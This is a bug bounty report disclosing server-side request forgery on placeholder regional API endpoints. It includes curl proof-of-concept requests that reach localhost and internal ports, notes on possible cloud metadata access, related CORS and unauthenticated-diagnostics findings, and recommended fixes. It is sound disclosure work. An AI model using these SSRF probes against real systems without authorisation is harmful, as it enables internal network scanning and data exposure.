# SSRF on Regional API Endpoints Allows Internal Network Access

**Bug Bounty Report**

*Publication note: Target domains, internal addresses and service ports, diagnostic paths, application identity, timestamps, error prefixes, and software versions have been replaced with placeholders or representative values. The request structure and response evidence are preserved. Loopback and private addresses below are illustrative; they do not disclose the target network.*

## Summary
The regional API endpoints (`region-a-api.example.com`, `region-b-api.example.com`) are vulnerable to Server-Side Request Forgery (SSRF) via the root proxy parameter (`?url=`). Unlike production (`api.example.com`), the regional instances do not enforce a host allowlist, enabling access to localhost and internal Docker network services.

## Vulnerability Type
Server-Side Request Forgery (SSRF)

## Affected Endpoints
- `https://region-a-api.example.com/?url=`
- `https://region-b-api.example.com/?url=`

## Description
The regional API endpoints (`region-a-api.example.com` and `region-b-api.example.com`) contain an SSRF vulnerability in proxy functionality at the root endpoint.

Production (`api.example.com`) applies a host allowlist and blocks internal targets, but regional instances allow arbitrary URL fetching, including internal and localhost addresses.

This allows an attacker to:
1. Access localhost services (`127.0.0.1:8080`)
2. Access Docker network services (`10.0.0.10:22`)
3. Enumerate internal services and ports
4. Potentially access databases, caches, or admin panels on the internal network
5. Attempt AWS metadata access via IMDS (currently mitigated by IMDSv2 enforcement; IMDSv1 would risk credential exposure)

## Steps to Reproduce
1. Send a request to the region A endpoint with a localhost URL:

```bash
curl "https://region-a-api.example.com/?url=http://127.0.0.1:8080/"
```

Expected vulnerable response:

```json
{"message":"[REDACTED-APP] is active!","js":"[REDACTED-TIMESTAMP]"}
```

2. Send a request to the region A endpoint with the internal Docker bridge URL:

```
   https://region-a-api.example.com/?url=http://10.0.0.10:22/
```

 Response:

```json
   {
     "message": "[REDACTED-PREFIX]: ClientResponseError: ... Expected HTTP/, RTSP/ or ICE/:

     b'SSH-2.0-OpenSSH_[REDACTED-VERSION]'
       ^"
   }
```
3. Confirm external SSRF behavior:

```bash
curl "https://region-a-api.example.com/?url=https://httpbin.org/ip"
```

Response:

```json
{"origin":"[REDACTED-PUBLIC-IP]"}
```

4. Compare with production behavior (blocked):

```bash
curl "https://api.example.com/?url=http://127.0.0.1:8080/"
```

Response:

```json
{"message":"[REDACTED-APP] Proxy: Host not allowed"}
```

## Impact
- Access to internal services not exposed to the internet
- Potential access to databases, Redis, or other backend services on Docker network
- Server-side port scanning of internal infrastructure
- Potential AWS credential theft if IMDSv1 were enabled
- Can be chained with CORS misconfiguration (`Access-Control-Allow-Origin` reflects arbitrary origins with `Access-Control-Allow-Credentials: true`) to perform SSRF via a victim browser session

## Additional Findings
Additional issues discovered during testing:

1. CORS misconfiguration (all endpoints)
  - `Access-Control-Allow-Origin` reflects arbitrary origins
  - `Access-Control-Allow-Credentials: true`
  - Enables cross-origin credentialed requests from untrusted websites

2. Unauthenticated `/diagnostics` endpoint (region A/B only)
  - `GET /diagnostics?cmd=info` discloses server version, uptime, and session count without authentication
  - Production (`api.example.com`) requires a token; regional instances do not

3. Exposed OpenAPI documentation
  - `/docs` and `/openapi.json` are publicly accessible on all endpoints

## Recommended Fix
1. Apply the same host allowlist used by `api.example.com` to all regional instances
2. Block requests to private/link-local/localhost ranges:
  - `127.0.0.0/8`
  - `10.0.0.0/8`
  - `172.16.0.0/12`
  - `192.168.0.0/16`
  - `169.254.0.0/16`
3. Require authentication for `/diagnostics` on regional instances
4. Restrict CORS to trusted, explicit origins (do not reflect arbitrary origins)

